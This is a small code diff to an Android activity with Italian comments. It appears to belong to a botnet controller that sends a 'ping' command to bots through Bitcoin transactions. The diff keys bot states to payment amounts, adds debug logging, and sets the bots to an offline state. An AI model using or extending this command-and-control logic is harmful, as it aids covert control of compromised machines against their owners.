@@ -116,11 +116,21 @@ public class MainActivity extends AppCompatActivity {
 
                         appState.wallet.addWatchedAddress(appState.wallet.freshReceiveAddress());
 
-                        //Inviamo il comando solo ai bot che hanno lo stato "ok"
-                        appState.sendCommand("ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString(), appState.getBotStateOk());
+                        Log.d("MAP", "MAPPA PRIMA PING INIZIALE");
+                        appState.logMappaIndirizzi();
+                        //Inviamo il comando solo ai bot che hanno lo stato START (0,002 Bitcoin)
+                        String message = "ping-"+appState.wallet.currentReceiveKey().toAddress(appState.params).toString();
+                        Log.d("App", "NUMERO DEI BOT CON STATO START: " +appState.getBotStateStart().size());
+                        appState.sendCommand(message);
+
+                        //Inviamo il comando solo ai bot che hanno lo stato ONLINE (0,001 Bitcoin)
+                        //appState.sendCommand(Coin.MILLICOIN, message, appState.getBotStateOnline());
 
                         //Cambia lo stato dei bot in "no"
-                        appState.setStatoBots("no");
+                        appState.setStatoBots(appState.BOT_STATE_OFFLINE);
+
+                        Log.d("MAP", "MAPPA DOPO PING INIZIALE");
+                        appState.logMappaIndirizzi();
 
                         Intent intent = new Intent(MainActivity.this, BotListActivity.class);
                         startActivity(intent);
